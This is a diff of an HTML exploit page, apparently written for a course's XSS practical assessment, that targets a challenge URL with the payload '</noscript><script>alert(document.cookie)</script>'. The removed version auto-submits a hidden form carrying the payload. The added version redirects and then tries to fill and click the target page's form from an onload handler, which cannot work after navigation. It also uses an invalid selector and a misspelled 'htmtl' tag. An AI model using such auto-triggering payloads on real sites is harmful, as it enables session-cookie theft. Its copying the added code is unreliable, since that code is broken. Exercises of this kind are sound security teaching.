@@ -2,22 +2,35 @@
 <htmtl lang="en">
   <head>
     <meta charset="UTF-8" />
-    <title>XSS Trigger</title>
+    <title>Auto Trigger XSS</title>
   </head>
   <body>
-    <form
-      id="xssForm"
-      method="POST"
-      action="https://inte2102.semiregular.space/Practical_Assessment/1/XSS/%7B589ebe15-e897-442f-9041-cb78f7a8b952%7D/ex6/"
-    >
-      <input
-        type="text"
-        name="query"
-        value="</noscript><script>alert(document.cookie)</script>"
-      />
-    </form>
     <script>
-      document.getElementById("xssForm").submit();
+      // Redirect to the challenge page
+      window.location =
+        "https://inte2102.semiregular.space/Practical_Assessment/1/XSS/%7B589ebe15-e897-442f-9041-cb78f7a8b952%7D/ex6/";
+
+      // Automatically fill the vulnerable input field and search for submit button
+      window.onload = function () {
+        // find the input field
+        var inputField = document.querySelector('input[name="query"]');
+        if (inputField) {
+          // Insert payload to the text box
+          inputField.value =
+            "</noscript><script>alert(document.cookie)<\/script>";
+
+          // Find and click the submit button to submit the form
+          var submitButton = document.querySelector("submit#Search");
+          if (submitButton) {
+            // Simulate click on submit button
+            submitButton.click();
+          } else {
+            console.error("Submit button not found");
+          }
+        } else {
+          console.error("Vulnerable input field not found.");
+        }
+      };
     </script>
   </body>
 </htmtl>
